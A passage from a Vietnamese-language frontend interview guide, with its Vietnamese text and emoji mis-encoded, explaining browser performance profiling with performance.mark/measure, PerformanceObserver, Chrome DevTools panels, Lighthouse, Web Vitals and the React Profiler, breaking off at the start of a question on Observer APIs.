    performance.mark(`${markName}-error`);
    console.error(`âŒ Failed to fetch user ${userId}`);
    throw error;
  }
}

// ğŸ”¹ COMPONENT RENDER TIME - React
function ProfileComponent({ userId }: { userId: string }) {
  useEffect(() => {
    performance.mark('profile-render-start');
    
    return () => {
      performance.mark('profile-render-end');
      performance.measure('profile-render', 'profile-render-start', 'profile-render-end');
      
      const measure = performance.getEntriesByName('profile-render')[0];
      console.log(`Profile rendered in ${measure.duration.toFixed(2)}ms`);
      
      // Cleanup marks Ä‘á»ƒ trÃ¡nh memory leak
      performance.clearMarks('profile-render-start');
      performance.clearMarks('profile-render-end');
      performance.clearMeasures('profile-render');
    };
  }, [userId]);
  
  return <div>Profile for {userId}</div>;
}

// ğŸ”¹ NESTED OPERATIONS - Äo nhiá»u operations lá»“ng nhau
async function loadDashboard() {
  performance.mark('dashboard-load-start');
  
  // Sub-operation 1: Fetch user
  performance.mark('fetch-user-start');
  const user = await fetchUser();
  performance.mark('fetch-user-end');
  performance.measure('fetch-user', 'fetch-user-start', 'fetch-user-end');
  
  // Sub-operation 2: Fetch orders
  performance.mark('fetch-orders-start');
  const orders = await fetchOrders(user.id);
  performance.mark('fetch-orders-end');
  performance.measure('fetch-orders', 'fetch-orders-start', 'fetch-orders-end');
  
  // Sub-operation 3: Render charts
  performance.mark('render-charts-start');
  renderCharts(orders);
  performance.mark('render-charts-end');
  performance.measure('render-charts', 'render-charts-start', 'render-charts-end');
  
  performance.mark('dashboard-load-end');
  performance.measure('dashboard-load', 'dashboard-load-start', 'dashboard-load-end');
  
  // Print all measurements
  const measures = performance.getEntriesByType('measure');
  console.table(
    measures.map(m => ({
      name: m.name,
      duration: `${m.duration.toFixed(2)}ms`,
    }))
  );
}

// ğŸ”¹ HELPER - Performance Monitor Utility
class PerformanceMonitor {
  private marks = new Map<string, number>();
  
  start(label: string) {
    this.marks.set(label, performance.now());
    performance.mark(`${label}-start`);
  }
  
  end(label: string) {
    const startTime = this.marks.get(label);
    if (!startTime) {
      console.warn(`No start mark for ${label}`);
      return;
    }
    
    const endTime = performance.now();
    const duration = endTime - startTime;
    
    performance.mark(`${label}-end`);
    performance.measure(label, `${label}-start`, `${label}-end`);
    
    console.log(`â±ï¸ ${label}: ${duration.toFixed(2)}ms`);
    
    // Cleanup
    this.marks.delete(label);
    performance.clearMarks(`${label}-start`);
    performance.clearMarks(`${label}-end`);
    
    return duration;
  }
  
  clearAll() {
    performance.clearMarks();
    performance.clearMeasures();
    this.marks.clear();
  }
}

// Usage
const monitor = new PerformanceMonitor();

monitor.start('data-processing');
processLargeDataset();
monitor.end('data-processing'); // â±ï¸ data-processing: 234.56ms
```

**ğŸ’¡ Best Practices:**
- âœ… DÃ¹ng meaningful labels: `fetch-user-123` thay vÃ¬ `op1`
- âœ… Cleanup marks/measures sau khi dÃ¹ng (trÃ¡nh memory leak)
- âœ… Group related operations: `dashboard-load`, `dashboard-load/fetch-user`, etc.
- âœ… Log vÃ o analytics service (khÃ´ng chá»‰ console.log)

---

#### **2ï¸âƒ£ Long Tasks API - PerformanceObserver**

**ğŸ”¹ Detect Long Tasks (>50ms)**

Long tasks lÃ  cÃ¡c tasks cháº¡y **quÃ¡ 50ms**, block main thread vÃ  gÃ¢y lag UI.

```typescript
// =====================================
// LONG TASKS DETECTION
// =====================================

// ğŸ”¹ CÆ  Báº¢N - Detect all long tasks
const observer = new PerformanceObserver((list) => {
  for (const entry of list.getEntries()) {
    console.warn('ğŸŒ Long task detected:', {
      name: entry.name,
      duration: `${entry.duration.toFixed(2)}ms`,
      startTime: entry.startTime,
    });
  }
});

observer.observe({ type: 'longtask', buffered: true });

// ğŸ”¹ THá»°C Táº¾ - Long Task Monitor vá»›i alerts
class LongTaskMonitor {
  private longTasks: PerformanceEntry[] = [];
  private observer: PerformanceObserver | null = null;
  
  start(options = { threshold: 50, alertThreshold: 100 }) {
    this.observer = new PerformanceObserver((list) => {
      for (const entry of list.getEntries()) {
        this.longTasks.push(entry);
        
        // Alert náº¿u task quÃ¡ dÃ i
        if (entry.duration > options.alertThreshold) {
          console.error(`ğŸš¨ CRITICAL: Task blocked UI for ${entry.duration.toFixed(2)}ms`);
          
          // Gá»­i alert Ä‘áº¿n monitoring service
          this.sendAlert({
            type: 'LONG_TASK',
            duration: entry.duration,
            timestamp: Date.now(),
            url: window.location.href,
          });
        }
      }
    });
    
    this.observer.observe({ type: 'longtask', buffered: true });
  }
  
  stop() {
    this.observer?.disconnect();
  }
  
  getReport() {
    return {
      totalLongTasks: this.longTasks.length,
      averageDuration: this.longTasks.reduce((sum, t) => sum + t.duration, 0) / this.longTasks.length,
      maxDuration: Math.max(...this.longTasks.map(t => t.duration)),
      tasks: this.longTasks.map(t => ({
        duration: t.duration,
        startTime: t.startTime,
      })),
    };
  }
  
  private sendAlert(data: any) {
    // Gá»­i Ä‘áº¿n Sentry, Datadog, etc.
    fetch('/api/monitoring/alert', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
    });
  }
}

// Usage
const longTaskMonitor = new LongTaskMonitor();
longTaskMonitor.start({ threshold: 50, alertThreshold: 100 });

// Sau 5 phÃºt, láº¥y report
setTimeout(() => {
  const report = longTaskMonitor.getReport();
  console.log('ğŸ“Š Long Tasks Report:', report);
}, 5 * 60 * 1000);

// ğŸ”¹ OBSERVE MULTIPLE TYPES - Theo dÃµi nhiá»u loáº¡i performance entries
const multiObserver = new PerformanceObserver((list) => {
  for (const entry of list.getEntries()) {
    switch (entry.entryType) {
      case 'longtask':
        console.warn('ğŸŒ Long task:', entry.duration);
        break;
      case 'measure':
        console.log('â±ï¸ Measure:', entry.name, entry.duration);
        break;
      case 'navigation':
        console.log('ğŸŒ Navigation timing:', entry);
        break;
      case 'resource':
        console.log('ğŸ“¦ Resource loaded:', entry.name, entry.duration);
        break;
    }
  }
});

multiObserver.observe({ entryTypes: ['longtask', 'measure', 'navigation', 'resource'] });
```

**ğŸ’¡ Táº¡i Sao 50ms?**
- 60 FPS = 16.67ms per frame
- 50ms = 3 frames dropped â†’ user tháº¥y lag rÃµ rÃ ng
- Google recommends: Keep tasks <50ms Ä‘á»ƒ UI mÆ°á»£t

---

#### **3ï¸âƒ£ Chrome DevTools - Performance Tab**

**ğŸ”¹ CÃ¡ch Sá»­ Dá»¥ng Performance Tab Hiá»‡u Quáº£**

```
CHROME DEVTOOLS â†’ PERFORMANCE TAB
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  ğŸ¬ RECORD                                                   â”‚
â”‚  â”œâ”€ Start recording                                         â”‚
â”‚  â”œâ”€ Perform actions (load page, click, scroll)              â”‚
â”‚  â””â”€ Stop recording                                          â”‚
â”‚                                                              â”‚
â”‚  ğŸ“Š ANALYZE                                                  â”‚
â”‚  â”œâ”€ Main Thread (flame chart)                               â”‚
â”‚  â”‚  â””â”€ Identify long tasks (yellow/red bars)                â”‚
â”‚  â”œâ”€ Network (waterfall)                                     â”‚
â”‚  â”‚  â””â”€ Check slow requests                                  â”‚
â”‚  â”œâ”€ Frames (FPS)                                            â”‚
â”‚  â”‚  â””â”€ Find dropped frames (<60 FPS)                        â”‚
â”‚  â””â”€ Bottom-Up / Call Tree / Event Log                       â”‚
â”‚     â””â”€ Find heaviest functions                              â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**ğŸ”¹ Performance Tab - Step by Step Guide:**

```typescript
// STEP 1: Prepare
// - Má»Ÿ DevTools (F12 â†’ Performance tab)
// - Enable "Screenshots" Ä‘á»ƒ tháº¥y visual timeline
// - Enable "Memory" Ä‘á»ƒ track memory usage

// STEP 2: Record
// - Click Record button (â—)
// - Perform user actions (load page, click buttons, scroll)
// - Click Stop (â– ) after 5-10 seconds

// STEP 3: Analyze Flame Chart
/*
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Main Thread (Flame Chart)                                â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                           â”‚
â”‚  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ Task (120ms) âš ï¸ Long task!             â”‚
â”‚    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ Layout (80ms)                                â”‚
â”‚      â–ˆâ–ˆâ–ˆâ–ˆ JavaScript (60ms)                              â”‚
â”‚        â–ˆâ–ˆ my-function (40ms) â† BOTTLENECK!               â”‚
â”‚                                                           â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

COLOR CODING:
- ğŸŸ¨ Yellow: JavaScript execution
- ğŸŸª Purple: Rendering (Layout, Paint)
- ğŸŸ© Green: Painting
- ğŸŸ¦ Blue: Loading (HTML parsing)
- ğŸŸ¥ Red: Long tasks (>50ms)
*/

// STEP 4: Identify Bottlenecks
// - TÃ¬m red/yellow bars dÃ i (long tasks)
// - Click vÃ o bar â†’ xem Call Tree á»Ÿ bottom panel
// - TÃ¬m function nÃ o chiáº¿m nhiá»u thá»i gian nháº¥t

// STEP 5: Fix Issues
// Example: TÃ¬m tháº¥y my-function() chiáº¿m 40ms
function myFunction() {
  // âŒ BEFORE: Blocking operation
  const result = heavyCalculation(); // 40ms
  return result;
}

// âœ… AFTER: Break into chunks vá»›i setTimeout
function myFunctionOptimized() {
  return new Promise(resolve => {
    const chunks = splitIntoChunks(data, 1000);
    let index = 0;
    
    function processChunk() {
      processData(chunks[index]);
      index++;
      
      if (index < chunks.length) {
        setTimeout(processChunk, 0); // Yield to browser
      } else {
        resolve();
      }
    }
    
    processChunk();
  });
}
```

**ğŸ’¡ Performance Tab - Key Metrics:**

```typescript
// Trong Performance recording, focus vÃ o:

// 1. FPS (Frames Per Second)
// âœ… Target: 60 FPS (green bars)
// âš ï¸ Warning: <60 FPS (yellow bars)
// âŒ Critical: <30 FPS (red bars)

// 2. CPU Usage
// âœ… Good: <50% average
// âš ï¸ Warning: 50-80%
// âŒ Bad: >80% sustained

// 3. Main Thread Activity
// âœ… Good: Short tasks (<50ms)
// âŒ Bad: Long tasks (>50ms, red bars)

// 4. Memory
// âœ… Good: Stable (sawtooth pattern = GC working)
// âŒ Bad: Continuously increasing (memory leak)
```

---

#### **4ï¸âƒ£ Lighthouse - Automated Audits**

**ğŸ”¹ Lighthouse CI - Performance Audits**

Lighthouse lÃ  tool audit tá»± Ä‘á»™ng cá»§a Google, tÃ­ch há»£p trong Chrome DevTools.

```typescript
// =====================================
// LIGHTHOUSE AUDITS
// =====================================

// ğŸ”¹ RUN LIGHTHOUSE
// Method 1: Chrome DevTools
// - F12 â†’ Lighthouse tab
// - Select categories: Performance, Accessibility, Best Practices, SEO
// - Click "Analyze page load"

// Method 2: CLI
// npm install -g lighthouse
// lighthouse https://example.com --view

// Method 3: CI/CD (GitHub Actions)
/*
name: Lighthouse CI
on: [pull_request]
jobs:
  lighthouse:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - uses: treosh/lighthouse-ci-action@v9
        with:
          urls: |
            https://example.com
          uploadArtifacts: true
*/

// ğŸ”¹ LIGHTHOUSE SCORES
interface LighthouseScores {
  performance: number;        // 0-100 (Target: >90)
  accessibility: number;      // 0-100 (Target: >90)
  bestPractices: number;      // 0-100 (Target: >90)
  seo: number;                // 0-100 (Target: >90)
  pwa: number;                // 0-100 (optional)
}

// ğŸ”¹ KEY METRICS - Web Vitals
interface WebVitals {
  // LOADING PERFORMANCE
  FCP: number;  // First Contentful Paint (<1.8s âœ…)
  LCP: number;  // Largest Contentful Paint (<2.5s âœ…)
  
  // INTERACTIVITY
  FID: number;  // First Input Delay (<100ms âœ…)
  TBT: number;  // Total Blocking Time (<200ms âœ…)
  TTI: number;  // Time to Interactive (<3.8s âœ…)
  
  // VISUAL STABILITY
  CLS: number;  // Cumulative Layout Shift (<0.1 âœ…)
  
  // SPEED INDEX
  SI: number;   // Speed Index (<3.4s âœ…)
}

// ğŸ”¹ IMPROVE LIGHTHOUSE SCORE - Common Fixes
const lighthouseOptimizations = {
  // 1. IMAGES
  images: {
    problem: "Unoptimized images",
    solution: [
      "âœ… Use WebP format",
      "âœ… Compress images (TinyPNG, ImageOptim)",
      "âœ… Lazy load below-the-fold images",
      "âœ… Use responsive images (srcset)",
      "âœ… Add width/height to prevent CLS",
    ],
    example: `
      <img 
        src="image.webp" 
        srcset="image-320w.webp 320w, image-640w.webp 640w" 
        sizes="(max-width: 600px) 320px, 640px"
        width="640" 
        height="360" 
        loading="lazy"
        alt="Description"
      />
    `,
  },
  
  // 2. JAVASCRIPT
  javascript: {
    problem: "Render-blocking JS, large bundles",
    solution: [
      "âœ… Code splitting (React.lazy, dynamic import)",
      "âœ… Tree shaking (remove unused code)",
      "âœ… Minify & compress (Vite, webpack)",
      "âœ… Defer non-critical JS",
      "âœ… Remove unused libraries",
    ],
    example: `
      // Code splitting
      const Dashboard = React.lazy(() => import('./Dashboard'));
      
      // Dynamic import
      button.addEventListener('click', async () => {
        const module = await import('./heavy-module.js');
        module.run();
      });
    `,
  },
  
  // 3. CSS
  css: {
    problem: "Render-blocking CSS, unused CSS",
    solution: [
      "âœ… Inline critical CSS",
      "âœ… Defer non-critical CSS",
      "âœ… Remove unused CSS (PurgeCSS)",
      "âœ… Minify CSS",
    ],
    example: `
      <!-- Critical CSS inline -->
      <style>
        /* Above-the-fold styles */
        .header { ... }
      </style>
      
      <!-- Non-critical CSS deferred -->
      <link rel="preload" href="styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
    `,
  },
  
  // 4. FONTS
  fonts: {
    problem: "Render-blocking fonts, FOIT/FOUT",
    solution: [
      "âœ… Preload fonts",
      "âœ… Use font-display: swap",
      "âœ… Self-host fonts (avoid Google Fonts latency)",
      "âœ… Subset fonts (remove unused glyphs)",
    ],
    example: `
      <!-- Preload critical fonts -->
      <link rel="preload" href="font.woff2" as="font" type="font/woff2" crossorigin>
      
      <!-- CSS -->
      @font-face {
        font-family: 'MyFont';
        src: url('font.woff2') format('woff2');
        font-display: swap; /* Show fallback immediately */
      }
    `,
  },
};

// ğŸ”¹ MEASURE WEB VITALS IN CODE
import { getCLS, getFID, getFCP, getLCP, getTTFB } from 'web-vitals';

function sendToAnalytics(metric: any) {
  // Gá»­i Ä‘áº¿n Google Analytics, Datadog, etc.
  console.log(metric.name, metric.value);
  
  fetch('/api/analytics', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(metric),
  });
}

getCLS(sendToAnalytics);  // Cumulative Layout Shift
getFID(sendToAnalytics);  // First Input Delay
getFCP(sendToAnalytics);  // First Contentful Paint
getLCP(sendToAnalytics);  // Largest Contentful Paint
getTTFB(sendToAnalytics); // Time to First Byte
```

---

#### **5ï¸âƒ£ Advanced Debugging Tools**

**ğŸ”¹ React DevTools Profiler**

```typescript
// =====================================
// REACT DEVTOOLS PROFILER
// =====================================

// USAGE:
// 1. Install React DevTools extension
// 2. Open DevTools â†’ Profiler tab
// 3. Click Record â†’ interact with app â†’ Stop
// 4. Analyze flame graph

// INTERPRET RESULTS:
/*
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Profiler - Flame Graph                                   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  App (120ms)                                             â”‚
â”‚    Dashboard (100ms) âš ï¸ Slow component!                  â”‚
â”‚      UserList (80ms) â† BOTTLENECK                        â”‚
â”‚        UserItem (5ms) x 200 renders = 1000ms total!      â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
*/

// FIX: Memoize UserItem Ä‘á»ƒ avoid re-renders
const UserItem = React.memo(({ user }) => {
  return <div>{user.name}</div>;
});

// ğŸ”¹ PROFILER API - Programmatic profiling
import { Profiler } from 'react';

function onRenderCallback(
  id: string,
  phase: 'mount' | 'update',
  actualDuration: number,
  baseDuration: number,
  startTime: number,
  commitTime: number
) {
  console.log(`${id} ${phase} phase took ${actualDuration.toFixed(2)}ms`);
  
  // Send to analytics náº¿u render quÃ¡ lÃ¢u
  if (actualDuration > 16) { // >1 frame (60 FPS)
    sendToAnalytics({
      component: id,
      phase,
      duration: actualDuration,
    });
  }
}

function App() {
  return (
    <Profiler id="Dashboard" onRender={onRenderCallback}>
      <Dashboard />
    </Profiler>
  );
}
```

**ğŸ”¹ Chrome DevTools - Memory Profiler**

```typescript
// =====================================
// MEMORY PROFILING
// =====================================

// DETECT MEMORY LEAKS:
// 1. DevTools â†’ Memory tab
// 2. Take Heap Snapshot
// 3. Interact with app (add/remove items)
// 4. Take another snapshot
// 5. Compare snapshots â†’ find increasing objects

// EXAMPLE: Memory leak detection
class MemoryLeakDetector {
  private snapshots: number[] = [];
  
  takeSnapshot() {
    // @ts-ignore
    if (performance.memory) {
      // @ts-ignore
      this.snapshots.push(performance.memory.usedJSHeapSize);
    }
  }
  
  analyze() {
    if (this.snapshots.length < 2) return;
    
    const growth = this.snapshots.map((snapshot, i) => {
      if (i === 0) return 0;
      return snapshot - this.snapshots[i - 1];
    });
    
    const avgGrowth = growth.reduce((a, b) => a + b, 0) / growth.length;
    
    if (avgGrowth > 1_000_000) { // >1MB growth per snapshot
      console.warn(`ğŸš¨ Possible memory leak! Average growth: ${(avgGrowth / 1_000_000).toFixed(2)}MB`);
    }
    
    return {
      snapshots: this.snapshots.map(s => (s / 1_000_000).toFixed(2) + 'MB'),
      growth: growth.map(g => (g / 1_000_000).toFixed(2) + 'MB'),
      avgGrowth: (avgGrowth / 1_000_000).toFixed(2) + 'MB',
    };
  }
}

// Usage: Take snapshot má»—i 10 giÃ¢y
const detector = new MemoryLeakDetector();
setInterval(() => {
  detector.takeSnapshot();
  console.log(detector.analyze());
}, 10000);
```

**ğŸ”¹ Network Panel - Performance**

```typescript
// =====================================
// NETWORK PERFORMANCE ANALYSIS
// =====================================

// CHROME DEVTOOLS â†’ NETWORK TAB
// - Enable "Disable cache"
// - Throttle: "Fast 3G" Ä‘á»ƒ test slow connections
// - Reload page (Cmd+R)

// KEY METRICS:
// 1. DOMContentLoaded (blue line) - HTML parsed
// 2. Load (red line) - All resources loaded
// 3. Waterfall - Visual timeline cá»§a requests

// ANALYZE:
/*
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Resource             Size      Time    Waterfall          â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ index.html           5 KB      100ms   â–ˆâ–ˆâ–ˆâ–ˆ               â”‚
â”‚ app.js               200 KB    800ms   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ       â”‚ âš ï¸ Large JS
â”‚ vendor.js            500 KB    2000ms  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â”‚ ğŸš¨ HUGE!
â”‚ image.png            2 MB      5000ms  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â”‚ ğŸš¨ Unoptimized
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
*/

// OPTIMIZATIONS:
const networkOptimizations = {
  largeJavaScript: [
    "âœ… Code splitting",
    "âœ… Tree shaking",
    "âœ… Gzip compression",
    "âœ… CDN delivery",
  ],
  
  largeImages: [
    "âœ… WebP format",
    "âœ… Lazy loading",
    "âœ… Responsive images",
    "âœ… CDN + image optimization service (Cloudinary, Imgix)",
  ],
  
  manyRequests: [
    "âœ… Bundle files",
    "âœ… HTTP/2 multiplexing",
    "âœ… Inline critical resources",
    "âœ… Remove unused libraries",
  ],
};
```

---

#### **ğŸ“š Tools Summary - Khi NÃ o DÃ¹ng Tool GÃ¬?**

| Tool | Use Case | When to Use |
|------|----------|-------------|
| **performance.mark/measure** | Äo timing specific operations | Development, production monitoring |
| **PerformanceObserver** | Detect long tasks, monitor vitals | Production monitoring |
| **Performance Tab** | Deep dive bottlenecks | Development debugging |
| **Lighthouse** | Overall performance audit | CI/CD, before deployment |
| **React DevTools** | React component profiling | Development, optimize re-renders |
| **Memory Profiler** | Detect memory leaks | Development debugging |
| **Network Panel** | Analyze loading performance | Development, optimize resources |

---

#### **ğŸ”¥ Best Practices**

**âœ… DO:**
1. **Measure first, optimize later**: Don't guess bottlenecks
2. **Set performance budgets**: 
   - LCP <2.5s
   - FID <100ms
   - CLS <0.1
   - JS bundle <200KB
3. **Monitor in production**: Use RUM (Real User Monitoring)
4. **Automate audits**: Lighthouse CI in GitHub Actions
5. **Test on real devices**: Don't rely only on desktop Chrome
6. **Profile regularly**: Weekly performance reviews
7. **Track over time**: Monitor trends, not just snapshots

**âŒ DON'T:**
1. **Premature optimization**: Measure before optimizing
2. **Ignore real-world conditions**: Test on 3G, slow devices
3. **Optimize in isolation**: Consider user experience holistically
4. **Forget cleanup**: Remove performance marks/observers
5. **Rely only on lab data**: Monitor real users (RUM)

---

#### **ğŸ¯ Common Mistakes & Corrections**

**âŒ Mistake 1: Optimizing without measuring**
```typescript
// âŒ BAD - Guessing bottleneck
function processData(data: any[]) {
  // Developer thinks: "Maybe sorting is slow?"
  return data.sort(); // Optimizes sorting without proof
}
```

**âœ… Correction:**
```typescript
// âœ… GOOD - Measure first
performance.mark('process-start');
const result = processData(data);
performance.mark('process-end');
performance.measure('process', 'process-start', 'process-end');

const measure = performance.getEntriesByName('process')[0];
console.log(`Process took: ${measure.duration}ms`);
// Result: 5ms â†’ sorting is NOT the bottleneck!
```

---

**âŒ Mistake 2: Ignoring long tasks**
```typescript
// âŒ BAD - Long blocking operation
function calculateAll() {
  for (let i = 0; i < 1000000; i++) {
    heavyCalculation(i); // Blocks UI for 2000ms!
  }
}
```

**âœ… Correction:**
```typescript
// âœ… GOOD - Break into chunks
async function calculateAll() {
  const chunks = 100;
  const itemsPerChunk = 10000;
  
  for (let chunk = 0; chunk < chunks; chunk++) {
    for (let i = 0; i < itemsPerChunk; i++) {
      heavyCalculation(chunk * itemsPerChunk + i);
    }
    
    // Yield to browser every chunk
    await new Promise(resolve => setTimeout(resolve, 0));
  }
}
```

---

**âŒ Mistake 3: Not testing on slow devices**
```typescript
// âŒ BAD - Only test on MacBook Pro M3
// Result: 60 FPS, loads in 1s âœ…
// Reality on iPhone 8: 20 FPS, loads in 8s âŒ
```

**âœ… Correction:**
```typescript
// âœ… GOOD - Test on real devices & throttling
// 1. Chrome DevTools â†’ Performance tab
// 2. CPU throttling: 4x slowdown
// 3. Network throttling: Fast 3G
// 4. Test on real iPhone 8 / Android mid-range
```

---

**ğŸ¯ Káº¿t Luáº­n:**

**Performance Profiling Checklist:**
- âœ… Use `performance.mark/measure` for custom timing
- âœ… Monitor long tasks with `PerformanceObserver`
- âœ… Deep dive with Chrome DevTools Performance Tab
- âœ… Automate audits with Lighthouse CI
- âœ… Profile React components with React DevTools
- âœ… Monitor memory with Memory Profiler
- âœ… Analyze network with Network Panel
- âœ… Track Web Vitals in production

**ğŸ’¡ Key Takeaway:**
> **"You can't improve what you don't measure. Always measure, analyze, optimize, then measure again!"**

---
</details>


<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸ‘ï¸ Q46: Observer APIs - Intersection, Resize, Mutation Observer</span></summary>


**â“ CÃ¢u Há»i:**

Observer APIs lÃ  gÃ¬? Khi nÃ o vÃ  táº¡i sao nÃªn dÃ¹ng chÃºng thay vÃ¬ event listeners truyá»n thá»‘ng?


**âœ… ÄÃ¡p Ãn Chi Tiáº¿t:**

**ğŸ¯ Tá»•ng Quan Observer APIs:**

Observer APIs lÃ  nhÃ³m Web APIs hiá»‡n Ä‘áº¡i cho phÃ©p **theo dÃµi (observe) cÃ¡c thay Ä‘á»•i** trong DOM má»™t cÃ¡ch **báº¥t Ä‘á»“ng bá»™ vÃ  hiá»‡u quáº£** mÃ  khÃ´ng cáº§n polling hay event listeners liÃªn tá»¥c.

**3 Observer APIs Quan Trá»ng:**

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    OBSERVER APIs                              â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                               â”‚
â”‚  1ï¸âƒ£ INTERSECTION OBSERVER (Quan sÃ¡t giao Ä‘iá»ƒm)              â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚ â€¢ Theo dÃµi element vÃ o/ra khá»i viewport                 â”‚ â”‚
â”‚  â”‚ â€¢ Use cases: Lazy loading, Infinite scroll, Analytics   â”‚ â”‚
â”‚  â”‚ â€¢ Thay tháº¿: scroll event + getBoundingClientRect()      â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚                                                               â”‚
â”‚  2ï¸âƒ£ RESIZE OBSERVER (Quan sÃ¡t thay Ä‘á»•i kÃ­ch thÆ°á»›c)          â”‚
